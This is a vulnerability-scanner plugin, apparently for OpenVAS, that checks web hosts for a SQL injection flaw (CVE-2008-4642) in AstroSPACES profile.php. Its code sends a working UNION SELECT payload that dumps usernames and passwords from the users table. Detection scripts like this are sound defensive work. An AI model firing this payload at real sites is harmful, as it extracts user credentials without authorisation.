if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.800118" );
	script_version( "2020-08-24T15:18:35+0000" );
	script_tag( name: "last_modification", value: "2020-08-24 15:18:35 +0000 (Mon, 24 Aug 2020)" );
	script_tag( name: "creation_date", value: "2008-10-23 14:16:10 +0200 (Thu, 23 Oct 2008)" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_cve_id( "CVE-2008-4642" );
	script_bugtraq_id( 31771 );
	script_name( "AstroSPACES profile.php SQL Injection Vulnerability" );
	script_xref( name: "URL", value: "http://xforce.iss.net/xforce/xfdb/45915" );
	script_xref( name: "URL", value: "http://secunia.com/advisories/32290" );
	script_xref( name: "URL", value: "http://www.milw0rm.com/exploits/6758" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2008 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	script_tag( name: "impact", value: "Successful attack could lead to application compromise or access
  or modify the data." );
	script_tag( name: "affected", value: "AstroSPACES 1.1.1 and prior on all running platform." );
	script_tag( name: "insight", value: "The flaw is due to input passed to the id parameter in profile.php
  file is not properly sanitised before being used in SQL queries." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running AstroSPACES, and is prone to SQL Injection
  Vulnerability." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
port = http_get_port( default: 80 );
if(!http_can_host_php( port: port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/astrospaces", http_cgi_dirs( port: port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: dir + "/index.php", port: port );
	if(!rcvRes){
		continue;
	}
	if(ContainsString( rcvRes, "Powered By AstroSPACES" )){
		url = dir + "/profile.php?action=view&id=160+AND+1=0+UNION+SELECT+ALL+1," + "group_concat(username,0x3a,password),3,4,5,6,7,8,9,10,11,12" + ",13,14+from+users--";
		sndReq = http_get( item: url, port: port );
		rcvRes = http_keepalive_send_recv( port: port, data: sndReq, bodyonly: TRUE );
		if(!rcvRes){
			continue;
		}
		if(IsMatchRegexp( rcvRes, "<td>Username :</td>" )){
			security_message( port: port );
			exit( 0 );
		}
	}
}
exit( 99 );

